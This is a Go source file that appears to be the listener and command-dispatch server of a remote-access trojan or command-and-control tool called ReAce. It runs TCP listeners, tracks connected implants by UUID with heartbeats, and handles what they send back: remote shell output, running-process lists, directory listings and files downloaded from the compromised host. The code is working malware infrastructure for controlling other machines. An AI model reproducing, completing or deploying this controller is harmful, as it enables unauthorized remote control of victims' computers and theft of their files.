package Server

import (
	"ReAce/Logger"
	"ReAce/Package"
	"ReAce/Sessions"
	"bytes"
	"errors"
	"fmt"
	"github.com/jedib0t/go-pretty/table"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io"
	"log"
	"net"
	"strings"
	"time"
)

type Listeners struct {
	Listeners map[string]*Listener
}

type Listener struct {
	listenertype int
	port         string
	ip           string
	status       int
	statChan     chan int
	listener     any
}

func NewListener(listenertype int, ip string, port string) *Listener {

	temp := &Listener{
		listenertype: listenertype,
		port:         port,
		ip:           ip,
		status:       STATUS_STOP,
		statChan:     make(chan int),
		listener:     nil,
	}
	return temp
}

func (l *Listener) GetStatus() int {

	return l.status
}

func (l *Listeners) Run(name string) error {
	if !l.CheckName(name) {
		return errors.New("错误的监听器名称")
	}
	temp := l.Listeners[name]
	if temp.GetStatus() == STATUS_STOP {

		temp.listener, _ = net.Listen("tcp", temp.ip+":"+temp.port)
		temp.status = STATUS_RUN
		go temp.LoopMessage()
		return nil
	} else {
		return errors.New("监听器已经在运行了")
	}

}

func (l *Listeners) Stop(name string) error {
	if !l.CheckName(name) {
		return errors.New("错误的监听器名称")
	}
	temp := l.Listeners[name]
	if temp.GetStatus() == STATUS_RUN {
		temp.status = STATUS_STOP
		(temp.listener.(net.Listener)).Close()
		return nil
	} else {
		return errors.New("监听器已经是停止了")
	}

}

func NewListeners() *Listeners {

	temp := make(map[string]*Listener, 0)
	return &Listeners{
		temp,
	}
}

func (l *Listeners) Add(name string, listenertype int, ip string, port string) error {
	//判断是否存在
	if l.CheckName(name) {
		return errors.New("该名称的监听器已存在")
	} else {
		listener := NewListener(listenertype, ip, port)
		//	listener.listener, _ = net.Listen("tcp", ip+":"+port)
		//	go listener.LoopMessage()
		l.Listeners[name] = listener
		return nil
	}

}

func (l *Listeners) CheckName(name string) bool {
	//检查是否存在该名字的监听器
	_, ok := l.Listeners[name]
	if ok {
		return true
	} else {
		return false
	}
}

func (l *Listeners) Remove(name string) error {
	if l.CheckName(name) {
		if l.Listeners[name].GetStatus() == STATUS_STOP {
			delete(l.Listeners, name)
			return nil
		} else {
			return errors.New("该监听器正在运行中,请先关闭")
		}

	} else {
		return errors.New("不存在该名称的监听器")
	}
}

func (l *Listener) ModifyName(oldname, newname string) {

}

func (l *Listener) ModifyType(name string, ishttp bool) {
	/* TODO
	1. 修改名字
	2. 修改端口

	*/
}

func (l *Listeners) Show() {
	t := table.Table{}
	t.AppendHeader(table.Row{"NAME", "IP", "PORT", "TYPE", "STATUS"})

	for name, lis := range l.Listeners {
		temp := ""
		status := ""
		switch lis.listenertype {
		case LISTEN_TCP:
			temp = "TCP"
			break
		case LISTEN_HTTP:
			temp = "HTTP"
			break
		case LISTEN_HTTPS:
			temp = "HTTPS"
			break
		case LISTEN_WEBSOCKET:
			temp = "WEBSOCKET"
			break
		}
		switch lis.status {
		case STATUS_RUN:
			status = Logger.GreenText("RUN")
			break
		case STATUS_STOP:
			status = Logger.RedText("STOP")
			break
		}
		t.AppendRow(table.Row{name, lis.ip,
			lis.port,
			temp,
			status})

	}
	fmt.Println(t.Render())
}

func (l *Listeners) GetListenersNames() []string {
	result := make([]string, 0)
	for name, _ := range l.Listeners {
		result = append(result, name)
	}
	return result
}

// 读取监听器修改状态
func (l *Listener) LoopStatusChange() {
	for {
		// 从管道中读取数据
		data, ok := <-l.statChan

		if !ok {
			// 如果通道已关闭，退出循环
			break
		}
		l.status = data
		fmt.Println(l.status)
	}
}

func (l *Listener) LoopMessage() {
	sListener := l.listener.(net.Listener)

	if l.GetStatus() == STATUS_STOP {
		for {

			if l.GetStatus() == STATUS_RUN {
				fmt.Println(l.GetStatus())
				break
			}
		}
	}

	defer sListener.Close()

	for {
		conn, err := sListener.Accept()
		if err != nil {
			log.Println(err)
			break
		}
		go PrePareHandler(conn)
	}

}

// 判断心跳
func HeartBeating(bytes chan string, timeout int, conn net.Conn) {
	var uuid string
	for {
		select {
		case fk := <-bytes:
			uuid = fk
			conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
			break

		case <-time.After(time.Duration(timeout) * time.Second):
			Logger.ALogger.Debug(uuid, "--已下线")
			Server.sessions.Delete(uuid)
			conn.Close()
			return
		}
	}

}
func GravelChannel(bytes []byte, mess chan byte) {
	for _, v := range bytes {
		mess <- v
		fmt.Println(v)
	}
	close(mess)
}

/*
接受handler
*/
func PrePareHandler(conn any) {
	if tcp, ok := conn.(net.Conn); ok {
		tcp.SetReadDeadline(time.Now().Add(time.Duration(5) * time.Second))

		message := make(chan string)
		go HeartBeating(message, 5, tcp)
		for {
			x := make([]byte, 6)

			_, err := tcp.Read(x)
			if err != nil {
				Logger.ALogger.Debug("错误无法读取1", err.Error())

				return
			}
			pLen := Package.GetPackLen(x)

			if pLen == 0 {
				fmt.Println(x)
				return
			}
			pack := make([]byte, pLen)

			_, err = io.ReadFull(tcp, pack)

			if err != nil {
				Logger.ALogger.Debug("错误无法读取2")
				return
			}

			sessionPack := Package.GetPackFromBytes(pack)
			if sessionPack.GetCmd() == Package.LOGIN_RECV {
				sS := Sessions.NewSession(sessionPack.GetUUID(), tcp, tcp.RemoteAddr().String())
				message <- sessionPack.GetUUID()
				go CMDDispatcher(sessionPack, sS)

			} else {
				val, ok := Server.sessions.Load(sessionPack.GetUUID())
				if ok {
					message <- sessionPack.GetUUID()
					go CMDDispatcher(sessionPack, val.(*Sessions.Session))

				}

			}
			Logger.ALogger.LogToFile("数据:", string(x))
		}

	}

}
func convertGB2312ToUnicode(data []byte) (string, error) {
	decoder := simplifiedchinese.GB18030.NewDecoder()
	reader := transform.NewReader(bytes.NewReader(data), decoder)
	unicodeBytes, err := io.ReadAll(reader)
	if err != nil {
		return "", err
	}

	return string(unicodeBytes), nil
}
func CMDDispatcher(p *Package.Package, session *Sessions.Session) {

	switch p.GetCmd() {
	case Package.LOGIN_RECV:
		{
			Server.AddSession(p.GetUUID(), session)

		}
	case Package.SHELL_RECV:
		{

			unicodeStr, err := convertGB2312ToUnicode(p.GetParams().([]byte))
			if err != nil {
				fmt.Println("Error:", err)
				return
			}

			Logger.ALogger.Success("\n", unicodeStr)

		}
	case Package.PROC_RECVLIST:
		{
			result := string(p.GetParams().([]byte))
			procs := strings.Split(result, "-")
			fmt.Println(procs)
			t := table.Table{}
			header := table.Row{"PROCES_SNAME", "PID"}
			t.AppendHeader(header)
			t.Style().Options.SeparateRows = true
			for _, val := range procs {
				procinformation := strings.Split(val, "#")
				if len(procinformation) == 1 {
					t.AppendRow(table.Row{procinformation[0], ""})
					continue
				}
				t.AppendRow(table.Row{procinformation[0], procinformation[1]})

			}

			fmt.Println(t.Render())
			return

		}
	case Package.FS_CURRENT:
		{
			result := string(p.GetParams().([]byte))
			Logger.ALogger.Success("工作目录:", result)
			break
		}
	case Package.FS_RECVFILES:
		{
			unicodeStr, _ := convertGB2312ToUnicode(p.GetParams().([]byte))
			//fmt.Println(result)
			files := strings.Split(unicodeStr, "<")
			Dirs := make([]string, 0)
			otherfiles := make([]string, 0)
			for _, file := range files {
				x := strings.Split(file, "?")
				if len(x) == 1 {
					break
				}
				if x[1] == "d" {
					Dirs = append(Dirs, x[0])

				} else {
					otherfiles = append(otherfiles, Logger.YellowText(x[0])+" size:"+Logger.GreenText(x[1]))
				}
			}
			for _, d := range Dirs {
				fmt.Println("[d]", Logger.RedText(d))
			}
			for _, otherfile := range otherfiles {
				fmt.Println("[f]", otherfile)
			}
			return
		}
	case Package.FS_DOWNLOAD:
		{

			Server.Downloader.SaveFile(p.GetParams().([]byte))
			break

		}
	case Package.FS_ERROR:
		{
			Logger.ALogger.Error(string(p.GetParams().([]byte)))
			return
		}

	}

}
